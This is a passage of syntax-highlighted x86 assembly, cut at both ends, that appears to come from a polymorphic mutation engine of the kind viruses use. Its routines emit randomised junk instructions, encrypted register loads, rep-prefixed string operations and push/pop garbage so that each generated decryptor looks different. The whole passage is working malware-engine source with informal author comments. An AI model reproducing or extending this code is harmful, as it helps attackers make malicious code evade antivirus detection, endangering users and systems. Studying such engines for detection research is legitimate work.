        </span><span class="sc1">;So, If u don't believe me, I'll show you some  functionz:</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_esi   ---   generate source</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_edi   ---   generate destination or source</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_ecx   ---   generate counter</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;...easy to understand...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_repeat</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; test, if global index register is generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; i must be far then about USED_MEMORY bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; garbage use only in main-poly loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; register ECX must be free</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; does ESI free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_part_2</span><span class="sc0">

        </span><span class="sc1">; does EDI free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_lods</span><span class="sc0">

        </span><span class="sc1">; all cmps/lods/stos/scas/movs, wow !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_repeat</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_repeat</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_repeat</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

    </span><span class="sc5">__gr_part_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; must be EDI free ..</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; only stos/scas ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_stos</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gr_scas</span><span class="sc0">

    </span><span class="sc5">__gr_cmps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">       </span><span class="sc1">;new esi to ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">       </span><span class="sc1">;new edi to ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_change</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">        </span><span class="sc1">;esi register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">        </span><span class="sc1">;edi register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">      </span><span class="sc1">;ecx register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">       </span><span class="sc1">;rep or repnz ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A6h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_lods</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; register EAX must be free</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_flods</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10111111b</span><span class="sc0">
    </span><span class="sc5">__gr_flods</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_stos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_scas</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_movs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_change</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">000000110b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">000000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_rep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0F2F3h</span><span class="sc0">       </span><span class="sc1">;repnz, rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_make_repnz</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">__gr_make_repnz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">        </span><span class="sc1">;ecx register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_esi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">       </span><span class="sc1">;esi start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_edi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000Ah</span><span class="sc0">        </span><span class="sc1">;edi start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;change esi and edi ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_change_no</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__gr_change_no</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_where_in_mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">USED_MEMORY</span><span class="sc0">
</span><span class="sc5">a_repeat</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate push value(32/16)/garbage/pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_pushpop_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; value32 OR value16 ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;save dword or word ?</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push16</span><span class="sc0">

        </span><span class="sc1">; short or long value ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push32_short</span><span class="sc0">

        </span><span class="sc1">; long value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">;save: PUSH 11223344h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;code:  68  44332211</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish32</span><span class="sc0">
    </span><span class="sc5">__ppv_push32_short</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">       </span><span class="sc1">;save: PUSH 00000009h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc0">          </span><span class="sc1">;code:  6A     09</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish32</span><span class="sc0">
    </span><span class="sc5">__ppv_push16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppv_push16_short</span><span class="sc0">

        </span><span class="sc1">; long short-value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6866h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish16</span><span class="sc0">
    </span><span class="sc5">__ppv_push16_short</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6A66h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish16</span><span class="sc0">

        </span><span class="sc1">; time to POP value</span><span class="sc0">
    </span><span class="sc5">__ppv_finish32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">     </span><span class="sc1">;POP reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
